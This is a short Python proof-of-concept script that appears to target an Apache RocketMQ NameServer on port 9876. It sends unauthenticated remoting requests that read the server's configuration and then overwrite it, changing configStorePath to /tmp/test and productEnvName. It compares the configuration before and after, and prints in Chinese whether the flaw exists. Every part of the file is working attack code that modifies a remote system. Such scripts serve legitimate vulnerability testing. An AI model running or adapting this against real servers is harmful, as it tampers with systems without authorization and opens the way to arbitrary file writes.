import random
import socket
import binascii

class poc:
    def __init__(self, url):
        self.url = url
        self.result_text = ""
        self.port = 9876

    def exploit(self, address):
        try:
            client_socket = socket.socket()
            client_socket.settimeout(5)  # Set socket timeout to 5 seconds
            client_socket.connect((address, self.port))

            header = '{"code":318,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":405}'.encode('utf-8')
            body = 'configStorePath=/tmp/test\nproductEnvName=test'+ str(random.randint(1, 10))

            header_length = int(len(binascii.hexlify(header).decode('utf-8')) / 2)
            header_length_hex = '00000000' + str(hex(header_length))[2:]
            total_length = int(4 + len(binascii.hexlify(body.encode('utf-8')).decode('utf-8')) / 2 + header_length)
            total_length_hex = '00000000' + str(hex(total_length))[2:]
            data = total_length_hex[-8:] + header_length_hex[-8:] + binascii.hexlify(header).decode('utf-8') + binascii.hexlify(body.encode('utf-8')).decode('utf-8')

            client_socket.send(bytes.fromhex(data))
            client_socket.recv(1024)

            client_socket.close()
        except socket.timeout:
            return False

    def get_namesrv_config(self, address):
        try:
            client_socket = socket.socket()
            client_socket.settimeout(5)
            client_socket.connect((address, self.port))

            header = '{"code":319,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":405}'.encode('utf-8')

            header_length = int(len(binascii.hexlify(header).decode('utf-8')) / 2)
            header_length_hex = '00000000' + str(hex(header_length))[2:]
            total_length = int(4 + header_length)
            total_length_hex = '00000000' + str(hex(total_length))[2:]
            data = total_length_hex[-8:] + header_length_hex[-8:] + binascii.hexlify(header).decode('utf-8')

            client_socket.send(bytes.fromhex(data))
            data_received = client_socket.recv(1024)

            client_socket.close()
            return data_received
        except socket.timeout:
            return False

    def main(self):
        ip = self.url
        result1 = self.get_namesrv_config(ip)
        self.exploit(ip)
        result2 = self.get_namesrv_config(ip)
        if result2 != result1:
            print("漏洞存在")
        else:
            print("漏洞不存在")

if __name__ == '__main__':
    ip = "127.0.0.1"
    poc(ip).main()